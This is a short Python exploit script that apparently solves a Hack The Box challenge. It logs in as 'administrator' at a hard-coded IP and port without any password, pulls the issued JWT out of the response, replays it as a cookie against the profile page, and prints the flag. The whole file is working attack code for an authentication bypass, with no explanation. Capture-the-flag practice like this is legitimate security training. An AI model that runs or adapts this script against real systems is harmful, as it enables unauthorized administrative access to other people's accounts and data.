import requests
import re

host, port = "83.136.253.59", 49003

url = f"http://{host}:{port}"
url_login = f"http://{host}:{port}/index.php/login"
url_flag = f"{url}/index.php/profile"

data = {
    "username": "administrator"
}

response = requests.post(url_login, json=data)

jwt_token = re.search(r'"token"\s*:\s*"([^"]+)"', response.text).group(1)

administrator_header = {
    "Content-Type": "application/json",
    "Cookie": f"token={jwt_token}"
}

response_flag = requests.get(url_flag, headers=administrator_header)

flag = re.search(r'HTB\{.*?\}', response_flag.text)

print(flag.group())